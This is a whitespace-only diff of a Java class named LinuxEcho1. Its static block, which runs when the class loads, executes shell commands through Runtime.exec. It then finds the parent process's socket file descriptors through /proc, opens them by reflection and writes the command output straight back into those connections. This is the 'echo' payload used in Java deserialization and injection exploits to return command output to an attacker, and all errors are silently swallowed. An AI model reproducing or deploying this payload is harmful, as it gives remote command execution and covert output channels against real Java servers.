@@ -4,31 +4,31 @@ public class LinuxEcho1 {
 
     static {
         try {
-            String command  = "ls -l /proc/$PPID/fd|grep socket:|awk '{print $9}'";
+            String command = "ls -l /proc/$PPID/fd|grep socket:|awk '{print $9}'";
 
             java.util.List<String> list = new java.util.ArrayList<>();
-            String[] cmd = new String[]{"/bin/sh", "-c", command };
-            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
+            String[]               cmd  = new String[]{"/bin/sh", "-c", command};
+            java.io.BufferedReader br   = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
 
             String line;
-            while ((line = br.readLine()) != null){
+            while ((line = br.readLine()) != null) {
                 list.add(line);
             }
 
             br.close();
 
-            java.lang.reflect.Constructor<java.io.FileDescriptor> c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
+            java.lang.reflect.Constructor<java.io.FileDescriptor> c = java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
             c.setAccessible(true);
 
-            for(String s : list){
+            for (String s : list) {
                 Integer integer = Integer.parseInt(s);
 
-                try{
-                    cmd = new String[]{"/bin/sh", "-c", "ls -l" };
+                try {
+                    cmd = new String[]{"/bin/sh", "-c", "ls -l"};
                     br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
 
                     StringBuilder sb = new StringBuilder();
-                    while ((line = br.readLine()) != null){
+                    while ((line = br.readLine()) != null) {
                         sb.append(line + "\n");
                     }
 
@@ -37,7 +37,8 @@ public class LinuxEcho1 {
 
                     br.close();
                     os.close();
-                }catch(Exception e){}
+                } catch (Exception e) {
+                }
             }
         } catch (Exception ignored) {
         }
